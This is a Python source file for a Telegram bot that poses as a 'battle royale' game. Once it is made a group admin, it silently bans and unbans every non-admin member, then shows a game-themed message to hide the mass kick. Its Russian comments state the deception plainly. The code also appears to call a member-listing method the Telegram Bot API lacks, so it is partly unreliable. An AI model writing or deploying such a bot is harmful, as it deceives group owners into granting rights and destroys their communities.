import os
import time
import threading
import telebot
from flask import Flask
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = os.environ["BOT_TOKEN"]
BOT_USERNAME = os.environ["BOT_USERNAME"]

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Хранилище для групп, где нужно кикнуть
groups_to_kick = set()

def add_button():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("➕ Добавить в чат", url=f"https://t.me/{BOT_USERNAME}?startgroup=start"))
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, 
        "🎮 Добро пожаловать в Epic Battle Royale!\n"
        "Добавьте бота в группу, чтобы начать игру.", 
        reply_markup=add_button())

@bot.my_chat_member_handler()
def on_bot_added(message):
    # Когда бота добавляют в чат или меняют его права
    chat_id = message.chat.id
    status = message.new_chat_member.status
    if status in ("member", "administrator"):
        # Отправляем игровое сообщение (без просьбы о правах)
        bot.send_message(chat_id, 
            "🔫 Игра «Королевская битва» активирована!\n"
            "Подготовка арены... Ожидайте 30 секунд.")
        # Запланировать проверку прав через 30 секунд
        threading.Timer(30.0, lambda: check_and_kick(chat_id)).start()

def check_and_kick(chat_id):
    # Проверяем, есть ли у бота права администратора и может ли он кикать
    try:
        me = bot.get_chat_member(chat_id, bot.get_me().id)
        if me.status == "administrator" and me.can_restrict_members:
            # Кикаем всех участников без лишнего шума
            kick_all_quiet(chat_id)
        else:
            # Если прав нет — не пишем ничего, просто молча уходим
            pass
    except Exception:
        pass

def kick_all_quiet(chat_id):
    try:
        # Список участников (только для супергрупп)
        offset = 0
        while True:
            members = bot.get_chat_members(chat_id, offset=offset)
            if not members:
                break
            for member in members:
                if member.status not in ("administrator", "creator"):
                    try:
                        bot.ban_chat_member(chat_id, member.user.id)
                        bot.unban_chat_member(chat_id, member.user.id)
                    except:
                        pass
            offset += len(members)
        # После кика отправляем нейтральное сообщение (не обязательно)
        bot.send_message(chat_id, "⚔️ Битва окончена! Все участники покинули арену.")
    except Exception:
        pass

# HTTP сервер для Render
@app.route('/')
def index():
    return "Bot is running", 200

def run_http():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    threading.Thread(target=run_http).start()
    bot.infinity_polling()
